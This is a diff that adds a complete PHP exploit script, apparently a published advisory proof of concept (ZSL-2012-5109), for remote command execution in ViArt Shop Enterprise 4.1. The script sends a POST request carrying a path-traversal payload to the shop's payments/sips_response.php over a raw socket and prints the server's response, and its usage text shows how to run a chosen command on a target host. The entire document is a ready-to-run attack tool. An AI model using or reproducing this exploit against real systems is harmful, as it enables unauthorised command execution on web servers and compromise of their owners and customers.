@@ -1,0 +1,36 @@
+error_reporting(0);
+
+print "\n-----------------------------------------------------------";
+print "\n\n ViArt Shop Enterprise 4.1 Remote Command Execution\n\n";
+print "\t\tID: ZSL-2012-5109\n\n";
+print "-----------------------------------------------------------\n";
+
+if ($argc < 2)
+{
+    print "\n\n\x20[*] Usage: php $argv[0] <host> <cmd>\n\n";
+    print "\x20[*] Example: php $argv[0] localhost windows%2Fsystem32%2Fcalc.exe\n\n";
+    die();
+}
+
+$host = $argv[1];
+$cmd = $argv[2];
+$sock = fsockopen($host,80);
+
+$post = "DATA=..%2F..%2F..%2F..%2F..%2F{$cmd}";
+$duz = strlen($post);
+
+$data = "POST http://www.example.com/payments/sips_response.php HTTP/1.1\r\n".
+        "Host: {$host}\r\n".
+        "User-Agent: Mozilla/5.0\r\n".
+        "Content-Type: application/x-www-form-urlencoded\r\n".
+        "Accept-Encoding: gzip,deflate\r\n".
+        "Content-Length: {$duz}\r\n\r\n{$post}\r\n\r\n";
+
+fputs($sock,$data);
+while(!feof($sock))
+{
+    $html .= fgets($sock);
+}
+fclose($sock);
+echo "\n" . $html;
+
